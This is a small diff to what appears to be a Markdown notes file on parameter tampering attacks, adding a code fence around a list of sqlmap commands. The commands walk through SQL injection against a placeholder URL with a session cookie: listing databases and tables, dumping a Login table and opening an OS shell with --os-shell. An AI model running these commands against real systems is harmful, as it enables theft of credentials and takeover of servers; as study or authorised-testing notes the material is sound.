@@ -62,6 +62,7 @@
 <details>
   <summary>參數串改攻擊</summary>
 
+  ```console
   sqlmap -u "url" --cookie="<cookie>" 
   sqlmap -u "url" --cookie="<cookie>" --dbs 
   sqlmap -u "url" --cookie="<cookie>" -D dbname --tables 
@@ -69,4 +70,5 @@
   sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login --columns --technique=B 
   sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login -dump --technique=B 
   sqlmap -u "url" --cookie="<cookie>" --os-shell
+  ```
 </details>
